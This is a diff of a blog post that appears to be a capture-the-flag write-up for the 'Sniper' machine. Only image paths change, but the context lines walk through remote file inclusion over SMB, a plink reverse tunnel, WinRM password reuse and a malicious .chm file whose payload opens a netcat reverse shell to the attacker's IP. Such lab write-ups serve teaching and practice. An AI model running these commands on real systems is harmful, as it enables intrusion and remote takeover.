@@ -5,7 +5,7 @@ layout: post
 ---
 
 ## Summary
-![Image](./img/sniper_info.PNG)
+![Image](assets/img/sniper/sniper_info.PNG)
 
 - Directory brute-force
 - Remote File Inclusion (via SMB)
@@ -50,7 +50,7 @@ Host script results:
 ## Web Enumeration
 
 As we can see there aren't a whole lot of open ports to start poking at. I began by browsing to the website on port 80.
-![Image](./img/sniper_web_enum_1.png)
+![Image](assets/img/sniper/sniper_web_enum_1.png)
 
 Browsing and inspecting source code doesn't immediately reveal anything useful. I always like to run scans / automation tools up-front for efficiency and 
 directory brute-forcing should happen early! My tool of choice is [gobuster](https://github.com/OJ/gobuster) by OJ Reeves.
@@ -86,7 +86,7 @@ The two most interesting entries were **/blog** and **/user**. After poking arou
 one interesting artifact that might prove useful. The **/blog** site allows users to select a language. If a user selects a language from the navbar, a GET
 request is made to the blog site but a parameter is added: `?lang=blog-en.php`
 
-![Image](./img/sniper_web_enum_2.png)
+![Image](assets/img/sniper/sniper_web_enum_2.png)
 
 It looks like the page is loading the english version of the site's content from the file **blog-en.php** using PHP's [include](https://www.php.net/manual/en/function.include.php) statement.
 According to the manual, **"The include statement includes and evaluates the specified file."**. If any user has control over which file is "include"-ed on a web page,
@@ -99,14 +99,14 @@ is disbaled, so that only LFI is possible. Other times, the much safer `readfile
 For this reason I always like to test for LFI first, and if successful, then try for RFI. While poking around before, I could see that a custom 404 page was being served if I requested a resource that didn't exist - using the help of a file on the server at **/blog/js/error.js**. This seemed like
 a good target to try and confirm LFI before testing for RFI The image below shows that it worked! The code wasn't executed because it isn't valid PHP.
 
-![Image](./img/sniper_web_enum_3.png)
+![Image](assets/img/sniper/sniper_web_enum_3.png)
 
 ## Web Exploitation
 
 With this information I was able to start testing for RFI and had no luck at all trying to include remote files via HTTP. To do this I ran the python module `SimpleHTTPServer` on my kali machine and tried connecting to it with variations of the following:
 `http://10.10.10.151/blog/?lang=http://10.10.14.8/test.php`. Next I tried SMB and had success! I used [Impacket's](https://github.com/SecureAuthCorp/impacket) `smbserver.py` on kali and had remote machine to connect to my share.
 
-![Image](./img/sniper_web_exploit_1.png)
+![Image](assets/img/sniper/sniper_web_exploit_1.png)
 
 Unfortunately I wasn't able to fix the error with smbserver.py "Handle: [Error 104] Connection reset by peer", and was never able to successfully serve a php file this way (if anyone knows what's going on here please let me know). So instead I resorted to creating my own SMB share and configuring
 `smbd` to serve up my payload. Below are the steps for exploitation.
@@ -126,7 +126,7 @@ force user = nobody
 3. Start the smb service: `service smbd start`
 4. Make the HTTP GET request: `http://10.10.10.151/blog/?lang=\\10.10.14.8\share\shell.php&cmd=ipconfig`
 
-![Image](./img/sniper_web_exploit_2.png)
+![Image](assets/img/sniper/sniper_web_exploit_2.png)
 
 And now I've confirmed that I can execute code on the server!
 
@@ -177,7 +177,7 @@ I used my crappy shell to have a quick poke around before upgrading to a netcat 
 
 Here's the result:
 
-![Image](./img/sniper_web_exploit_3.png)
+![Image](assets/img/sniper/sniper_web_exploit_3.png)
   
 ## Privilege Escalation
 
@@ -200,7 +200,7 @@ if (mysqli_connect_errno())
 
 Host enumeration also shows the machine listening on port 5985, meaning Windows Remote Management/PSRemoting is probably enabled but blocked at the firewall. This would explain why nmap didn't reprot 5985 as open in my earlier scan. 
 
-![Image](./img/sniper_privesc_enum_1.png)
+![Image](assets/img/sniper/sniper_privesc_enum_1.png)
 
 Putting all of this information together gives me a path to attempt escalation. Using my existing shell, I can upload a tool to port-forward, creating a reverse tunnel back to my kali VM. Once the tunnel is established, I can test the password I've found against existing user accounts to see if I can escalate to a regular user. `net user` showed only one other local user account besides Administrator: **Chris**, so I'll check if he's re-used his password. The steps are as follows:
 
@@ -215,7 +215,7 @@ Putting all of this information together gives me a path to attempt escalation. 
     - (From Sniper) `Powershell Invoke-WebRequest -URI http://10.10.14.8/plink.exe -OutFile C:\Windows\System32\Spool\Drivers\Color\plink.exe`
     - `C:\Windows\System32\Spool\Drivers\Color\plink.exe -l pleb -pw Test123! -R 5985:127.0.0.1:5985 10.10.14.8` 
     - Here's where I'm at so far:
-    ![Image](./img/sniper_privesc_tunnel.png)
+    ![Image](assets/img/sniper/sniper_privesc_tunnel.png)
 4. Now to try Powershell Remoting through my tunnel from Kali. There are a few ways to do this and in another post I'll show the use of [evil-winrm](https://github.com/Hackplayers/evil-winrm), but for now I'll just use a simple ruby script that I found [here](https://alionder.net/winrm-shell/).
     - First, install the package ruby needs for the script to run `gem install winrm` ... easy!
     - Then edit the IP address and credentials in the script which should look like this:
@@ -245,7 +245,7 @@ Putting all of this information together gives me a path to attempt escalation. 
     ```
     - All that's left to do is run the script, and discover that Chris has been re-using his passwords! `ruby winrm.rb`
     pwd
-    ![Image](./img/sniper_privesc_winrm.png)
+    ![Image](assets/img/sniper/sniper_privesc_winrm.png)
 
 ### Client-Side Attack via .chm File
 
@@ -261,7 +261,7 @@ Sniper CEO.
 
 I transferred **instructions.chm** across to my Kali VM with netcat and inspected it with [xCHM](https://github.com/rzvncj/xCHM).
 
-![Image](./img/sniper_chm_file.png)
+![Image](assets/img/sniper/sniper_chm_file.png)
 
 A bit harsh maybe, but if I can create a malicious .chm that executes my own code and drop it in C:\Docs, hopefully the CEO should open it, running our code in his user context (ideally as Administrator).
 
@@ -269,10 +269,10 @@ The offensive Powershell framework [Nishang](https://github.com/samratashok/nish
   - I Download and install the HTML Help Workshop from https://www.microsoft.com/en-au/download/details.aspx?id=21138
   - shell.ps1 simply contained: `C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.5 4444 -e cmd.exe`
   
-![Image](./img/sniper_privesc_nishang.png)
+![Image](assets/img/sniper/sniper_privesc_nishang.png)
 
 Now that I have my malicious .chm file, I just need to transfer it to **C:\Docs** with my .ps1 payload and wait to catch a shell...
 
-![Image](./img/sniper_privesc_shell.png)
+![Image](assets/img/sniper/sniper_privesc_shell.png)
 
 And That's it! Thanks for reading :) As always, if you'd like to give feedback please email me at <apr4h.ctf@gmail.com>.
